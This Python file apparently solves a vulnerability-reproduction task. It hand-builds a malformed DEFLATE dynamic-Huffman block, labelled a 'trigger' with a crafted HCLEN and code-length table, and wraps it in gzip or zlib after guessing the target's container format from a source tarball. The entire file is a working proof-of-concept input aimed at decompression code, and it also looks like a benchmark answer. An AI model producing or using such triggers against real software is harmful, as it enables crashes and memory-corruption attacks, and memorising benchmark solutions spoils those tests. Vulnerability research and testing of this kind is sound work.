import io
import os
import tarfile
import zlib
from typing import Optional


class _BitWriter:
    __slots__ = ("_buf", "_cur", "_nbits")

    def __init__(self) -> None:
        self._buf = bytearray()
        self._cur = 0
        self._nbits = 0  # bits currently in _cur [0..7]

    def write_bits(self, value: int, nbits: int) -> None:
        v = value
        for _ in range(nbits):
            bit = v & 1
            v >>= 1
            self._cur |= (bit << self._nbits)
            self._nbits += 1
            if self._nbits == 8:
                self._buf.append(self._cur)
                self._cur = 0
                self._nbits = 0

    def finish(self) -> bytes:
        if self._nbits:
            self._buf.append(self._cur)
            self._cur = 0
            self._nbits = 0
        return bytes(self._buf)


def _make_deflate_trigger_hclen16() -> bytes:
    bw = _BitWriter()
    bw.write_bits(1, 1)      # BFINAL=1
    bw.write_bits(2, 2)      # BTYPE=10 (dynamic)
    bw.write_bits(0, 5)      # HLIT=0  => 257
    bw.write_bits(0, 5)      # HDIST=0 => 1
    bw.write_bits(12, 4)     # HCLEN=12 => 16 code length code lengths

    # Order: [16,17,18,0,8,7,9,6,10,5,11,4,12,3,13,2]
    # Set symbol 18 and 2 to length 1; others 0.
    clen_values = [0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1]
    for v in clen_values:
        bw.write_bits(v, 3)

    out = bw.finish()
    if len(out) != 9:
        if len(out) < 9:
            out += b"\x00" * (9 - len(out))
        else:
            out = out[:9]
    return out


def _wrap_gzip(deflate_bytes: bytes, crc32: int = 0, isize: int = 0) -> bytes:
    # GZIP header: ID1 ID2 CM FLG MTIME(4) XFL OS
    header = bytes([0x1F, 0x8B, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03])
    footer = (crc32 & 0xFFFFFFFF).to_bytes(4, "little") + (isize & 0xFFFFFFFF).to_bytes(4, "little")
    return header + deflate_bytes + footer


def _wrap_zlib(deflate_bytes: bytes, adler32: int = 1) -> bytes:
    # zlib header 0x78 0x01: CM=8, CINFO=7, FLEVEL=0, FCHECK valid
    header = bytes([0x78, 0x01])
    trailer = (adler32 & 0xFFFFFFFF).to_bytes(4, "big")
    return header + deflate_bytes + trailer


def _detect_container_from_tar(src_path: str) -> str:
    gzip_score = 0
    zlib_score = 0

    def score_bytes(name: str, data: bytes) -> None:
        nonlocal gzip_score, zlib_score
        low = data.lower()
        nlow = name.lower()

        if "gzip" in nlow or nlow.endswith(".gz") or nlow.endswith(".tgz"):
            gzip_score += 3
        if "zlib" in nlow:
            zlib_score += 3

        if b"gzip" in low or b"gunzip" in low or b"deflate" in low:
            gzip_score += 1
        if b"zlib" in low or b"adler" in low or b"adler32" in low:
            zlib_score += 2

        if b"\x1f\x8b" in data:
            gzip_score += 4
        if b"0x1f" in low and b"0x8b" in low:
            gzip_score += 3
        if b"id1" in low and b"id2" in low and b"0x8b" in low:
            gzip_score += 2

        if b"cmf" in low and b"flg" in low:
            zlib_score += 2
        if b"% 31" in low or b"%31" in low:
            zlib_score += 1
        if b"0x78" in low and (b"0x9c" in low or b"0x01" in low):
            zlib_score += 1

    try:
        with tarfile.open(src_path, "r:*") as tf:
            members = tf.getmembers()
            for m in members:
                if not m.isfile():
                    continue
                name = m.name
                if m.size <= 0:
                    continue
                if m.size > 2_000_000:
                    continue
                f = tf.extractfile(m)
                if f is None:
                    continue
                try:
                    data = f.read(64_000)
                finally:
                    try:
                        f.close()
                    except Exception:
                        pass
                if not data:
                    continue
                score_bytes(name, data)
    except Exception:
        return "gzip"

    if gzip_score <= 0 and zlib_score <= 0:
        return "gzip"
    if gzip_score >= zlib_score:
        return "gzip"
    return "zlib"


class Solution:
    def solve(self, src_path: str) -> bytes:
        deflate = _make_deflate_trigger_hclen16()

        container = _detect_container_from_tar(src_path)
        if container == "zlib":
            return _wrap_zlib(deflate, adler32=zlib.adler32(b"") & 0xFFFFFFFF)

        # Default to gzip
        return _wrap_gzip(deflate, crc32=zlib.crc32(b"") & 0xFFFFFFFF, isize=0)